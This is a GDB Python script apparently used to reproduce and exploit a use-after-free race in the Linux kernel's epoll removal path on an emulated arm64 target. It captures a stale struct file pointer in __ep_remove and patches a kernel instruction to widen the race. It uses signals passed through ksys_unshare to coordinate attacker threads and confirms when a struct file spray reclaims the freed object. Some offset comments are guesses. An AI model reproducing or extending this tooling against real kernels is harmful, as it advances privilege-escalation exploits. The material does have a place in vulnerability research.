import gdb
import time

stale_file_ptr = 0
orig_insn = 0
pc_addr = 0

bp_ep_remove = None
bp_file_free = None
bp_fput = None
bp_fput_match = None
bp_file_free_rcu = None

def to_u64(val):
    return val & 0xffffffffffffffff

class FputMatchBreakpoint(gdb.Breakpoint):
    def stop(self):
        global stale_file_ptr
        try:
            f = to_u64(int(gdb.parse_and_eval("$x0")))
            if f == stale_file_ptr and stale_file_ptr != 0:
                print(f"\\n[*] BINGO! __fput CALLED for STALE file 0x{f:x}!")
                print(f"[*] Verifying via register read inside breakpoint: $x0 = 0x{f:x}")
                
                f_op = to_u64(int(gdb.parse_and_eval(f"*(long*)({f} + 0x28)")))
                f_count = int(gdb.parse_and_eval(f"*(long*)({f} + 0x38)"))
                print(f"[*] f_op: 0x{f_op:x}, f_count: {f_count}")
        except Exception as e:
            pass
        return False

class KmallocRetBreakpoint(gdb.Breakpoint):
    def stop(self):
        global stale_file_ptr
        try:
            alloc_ptr = to_u64(int(gdb.parse_and_eval("$x0")))
            print(f"[DEBUG] kmem_cache_alloc returned 0x{alloc_ptr:x}")
            if alloc_ptr != 0 and alloc_ptr == stale_file_ptr:
                print(f"\\n[!!!] BINGO: RECLAIM SUCCESSFUL! struct file allocated at 0x{alloc_ptr:x} overlaps stale file_ptr!")
                print(f"[*] Verifying via register read inside breakpoint: $x0 = 0x{alloc_ptr:x}")
                return True
        except Exception as e:
            print(f"[DEBUG] KmallocRetBreakpoint Exception: {e}")
        return False

class FileFreeRcuBreakpoint(gdb.Breakpoint):
    def stop(self):
        global stale_file_ptr
        try:
            f = to_u64(int(gdb.parse_and_eval("$x1"))) # file_free_rcu is called via call_rcu, x1 might not be correct if it's the RCU head.
            # wait, file_free_rcu gets `struct rcu_head *head` in x0.
            # struct file *f = container_of(head, struct file, f_rcuhead);
            # f_rcuhead is at offset 0x38 in struct file? Let's assume x0 - offset.
            # I will just check x0 directly or print it.
            print(f"[DEBUG] file_free_rcu called with x0=0x{to_u64(int(gdb.parse_and_eval('$x0'))):x}")
            f_calc = to_u64(int(gdb.parse_and_eval("$x0")) - 0x30) # approx offset
            print(f"[DEBUG] f_calc=0x{f_calc:x}")
        except Exception as e:
            pass
        return False

class Thread1Breakpoint(gdb.Breakpoint):
    def stop(self):
        global stale_file_ptr, orig_insn, pc_addr, bp_fput_match
        try:
            epi = to_u64(int(gdb.parse_and_eval("$x1")))
            stale_file_ptr = to_u64(int(gdb.parse_and_eval(f"*(long*)({epi} + 0x30)")))
            f_op = to_u64(int(gdb.parse_and_eval(f"*(long*)({stale_file_ptr} + 0x28)")))
            f_count = int(gdb.parse_and_eval(f"*(long*)({stale_file_ptr} + 0x38)"))
            print("\\n=======================================================")
            print("=== STALE FILE POINTER CAPTURED IN THREAD 1 ===")
            print(f"    file_ptr: 0x{stale_file_ptr:x}")
            print(f"    f_op:     0x{f_op:x}")
            print(f"    f_count:  {f_count}")
            print("=======================================================\\n")
            bp_fput_match = FputMatchBreakpoint("__fput")
            func_addr = int(gdb.parse_and_eval("&__ep_remove"))
            pc_addr = func_addr + 280
            gdb.execute(f"set {{int}}{pc_addr} = 0x14000000")
        except Exception as e:
            pass
        self.enabled = False
        return False

class SignalBreakpoint(gdb.Breakpoint):
    def stop(self):
        global bp_ep_remove, bp_file_free, stale_file_ptr, bp_file_free_rcu
        try:
            flags = int(gdb.parse_and_eval("$x0"))
            if flags == 1111:
                print("\\n[*] Signal: Thread 1 is about to close outer epoll. Enabling __ep_remove breakpoint.")
                bp_ep_remove = Thread1Breakpoint("__ep_remove")
                gdb.execute("return -22")
                return False
            elif flags == 2222:
                print("\\n[*] Signal: Thread 2 is about to close inner epoll.")
                bp_file_free_rcu = FileFreeRcuBreakpoint("file_free_rcu")
                gdb.execute("return -22")
                return False
            elif flags == 3333:
                print("\\n[*] Signal: Thread 3 is about to spray struct file objects.")
                # We want to break after alloc_empty_file returns, or inside it. 
                # Breaking at __alloc_file + 48 might be compiler dependent, but we'll try to resolve it.
                # Actually, breaking on kmem_cache_alloc return is better, but __alloc_file+48 is what was used.
                alloc_file_addr = int(gdb.parse_and_eval("&__alloc_file"))
                bp_addr = alloc_file_addr + 48
                KmallocRetBreakpoint(f"*{bp_addr}")
                gdb.execute("return -22")
                return False
        except Exception as e:
            pass
        return False

def setup():
    gdb.execute("set pagination off")
    gdb.execute("set non-stop off")
    retries = 30
    while retries > 0:
        try:
            gdb.execute("target remote :1234")
            break
        except gdb.error:
            time.sleep(1)
            retries -= 1
    SignalBreakpoint("ksys_unshare")
    gdb.execute("continue")

setup()
